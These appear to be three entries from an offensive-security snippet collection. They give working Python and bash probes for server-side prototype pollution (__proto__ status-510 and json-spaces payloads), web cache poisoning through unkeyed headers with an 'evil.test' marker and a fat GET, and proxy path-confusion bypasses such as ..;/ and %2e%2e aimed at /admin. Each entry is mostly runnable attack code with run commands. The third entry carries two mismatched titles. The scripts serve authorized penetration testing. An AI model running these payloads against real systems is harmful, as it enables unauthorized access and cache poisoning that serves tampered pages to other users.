entries.title: Server-side prototype pollution probe (SSPP, status 510)
entries.body:
A black box for **server-side prototype pollution (SSPP)** using Gareth Heyes' (PortSwigger) method. It does not break the server; instead it looks for a **behavior change** after seeding `__proto__`: an HTTP-status override (the `status: 510` gadget) and a reaction to the `json spaces` gadget (the indentation in the JSON response changes). Safe: only observable side effects, no DoS.

> SSPP is not directly visible: you pollute the prototype through the JSON body, then send a normal request and watch whether the gadget "leaked". status 510 is the canonical detector: if the server suddenly answers 510, the prototype is polluted.

deps: `pip install requests`. placeholders: `{{URL}}` (an endpoint that accepts a JSON POST).

```python
#!/usr/bin/env python3
# proto_pollution_probe.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, json, requests

# gadget payloads: key -> what we seed -> how we detect
def pollute_bodies():
    return [
        ("status override 510",
         {"__proto__": {"status": 510}},
         lambda base, r: r.status_code == 510 and base != 510),
        ("json spaces gadget",
         {"__proto__": {"json spaces": 10}},
         None),  # detect by indentation change, see below
        ("constructor route",
         {"constructor": {"prototype": {"status": 510}}},
         lambda base, r: r.status_code == 510 and base != 510),
    ]

def send(url, body, hdr, timeout):
    return requests.post(url, json=body, headers=hdr, timeout=timeout, verify=False)

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL server-side prototype pollution probe")
    ap.add_argument("-u", "--url", required=True, help="endpoint accepting JSON POST")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--timeout", type=int, default=20)
    a = ap.parse_args()
    requests.packages.urllib3.disable_warnings()
    hdr = {"Content-Type": "application/json"}
    for h in a.header:
        k, _, v = h.partition(":"); hdr[k.strip()] = v.strip()

    base = send(a.url, {"ars3nal": "baseline"}, hdr, a.timeout)
    base_code = base.status_code
    base_indent = base.text[:200]
    print(f"[*] baseline status={base_code}\n")

    for label, body, detect in pollute_bodies():
        try:
            send(a.url, body, hdr, a.timeout)              # seed
            probe = send(a.url, {"ars3nal": "after"}, hdr, a.timeout)  # observe
        except requests.RequestException as e:
            print(f"  [{label}] error: {e}"); continue
        if detect:
            polluted = detect(base_code, probe)
        else:
            # json spaces: the response became noticeably "wider" in indentation
            polluted = (probe.text[:200] != base_indent and
                        probe.text.count("  ") > base_indent.count("  ") + 3)
        tag = "POLLUTED" if polluted else "clean   "
        print(f"  [{tag}] {label}  (probe status={probe.status_code})")
    print("\n[i] any POLLUTED -> confirm with a separate gadget and fix the prototype")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 proto_pollution_probe.py -u https://target/api/profile --header "Cookie: session=..."
```

entries.title: Web cache poisoning probe (unkeyed headers + fat GET)
entries.body:
A **web cache poisoning** probe: it looks for **unkeyed headers** (X-Forwarded-Host/Scheme, X-Host, X-Original-URL, X-Rewrite-URL) whose value is reflected in the response but is not part of the cache key. If the reflection gets cached, your "poisoned" version is served to others. Plus a **fat GET** probe (a body in a GET request).

> Method: you send a unique marker in a header, check for reflection in the response, then repeat without the header - if the marker is still there (from the cache), the page is poisoned. Cache signs: `X-Cache: hit`, `Age`, `CF-Cache-Status`.

deps: `pip install requests`. placeholders: `{{URL}}`.

```python
#!/usr/bin/env python3
# cache_poison_probe.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, time, requests

UNKEYED = [
    "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Server",
    "X-Host", "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix",
]

def cache_state(r):
    for h in ("X-Cache", "CF-Cache-Status", "X-Cache-Status", "Age"):
        if h in r.headers:
            return f"{h}={r.headers[h]}"
    return "no cache header"

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL cache poisoning probe")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--timeout", type=int, default=20)
    a = ap.parse_args()
    requests.packages.urllib3.disable_warnings()
    s = requests.Session()
    marker = "ars3nal" + str(int(time.time()))

    print(f"[*] {a.url}  marker={marker}\n")
    for h in UNKEYED:
        val = f"{marker}.evil.test"
        try:
            r1 = s.get(a.url, headers={h: val}, timeout=a.timeout, verify=False)
        except requests.RequestException as e:
            print(f"  {h}: error {e}"); continue
        reflected = marker in r1.text
        # repeat WITHOUT the header: if the marker stayed -> cached
        r2 = s.get(a.url, timeout=a.timeout, verify=False)
        cached = marker in r2.text
        tag = "POISONED" if (reflected and cached) else ("reflect" if reflected else "       ")
        print(f"  [{tag:8s}] {h:22s} reflect={reflected} cached={cached}  ({cache_state(r1)})")

    print("\n=== fat GET (body in GET) ===")
    try:
        rg = s.request("GET", a.url, data=f"x={marker}", timeout=a.timeout, verify=False,
                       headers={"Content-Type": "application/x-www-form-urlencoded"})
        print(f"  status={rg.status_code} marker_reflected={marker in rg.text}  ({cache_state(rg)})")
    except requests.RequestException as e:
        print(f"  fat GET error: {e}")
    print("\n[=] POISONED = unkeyed header is reflected AND cached")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 cache_poison_probe.py -u https://target/
```

entries.title: Client-Side Path Traversal (CSPT) finder
Proxy misrouting / path-confusion probe
entries.body:
A probe for **proxy routing desync** (path-confusion): the front proxy and the backend normalize the path differently, and with tricks like `..;/`, `/%2e%2e/`, a backslash, a double slash you can reach protected paths (`/admin`, internal) that the proxy "thinks" it blocked.

> Idea: the proxy sees a harmless path, the backend - after normalization - sees `/admin`. The script takes a protected path and tries a batch of bypasses, comparing the response code with the direct request.

deps: `curl`. placeholders: `{{BASE}}` (the base), `{{PROTECTED}}` (a protected path, e.g. /admin).

```bash
#!/usr/bin/env bash
# proxy_misrouting_probe.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
set -u
BASE="${1:?usage: proxy_misrouting_probe.sh <base-url> <protected-path>}"
P="${2:?need protected path e.g. /admin}"
BASE="${BASE%/}"; P="/${P#/}"
C="curl -s -k -o /dev/null --max-time 8 -w %{http_code}"

direct=$($C "$BASE$P")
echo "[*] direct $P -> $direct (expecting 401/403)"
echo

# set of bypasses; %s -> the protected segment without the leading slash
SEG="${P#/}"
PAYLOADS="
/..;/$SEG
/%2e%2e/$SEG
/./$SEG
//$SEG
/$SEG/.
/$SEG..;/
/%2f$SEG
/..%2f$SEG
/;/$SEG
/$SEG%00
/$SEG/..%2f..%2f$SEG
"

echo "$PAYLOADS" | while read -r path; do
  [ -z "$path" ] && continue
  code=$($C "$BASE$path")
  flag=""
  case "$code" in
    200|301|302) flag="  <-- reachable (bypass?)";;
  esac
  printf "  %-3s %s%s\n" "$code" "$path" "$flag"
done

echo
echo "[=] 200/redirect where direct gave 401/403 = routing bypass"
```

Run:
```bash
bash proxy_misrouting_probe.sh https://target /admin
```
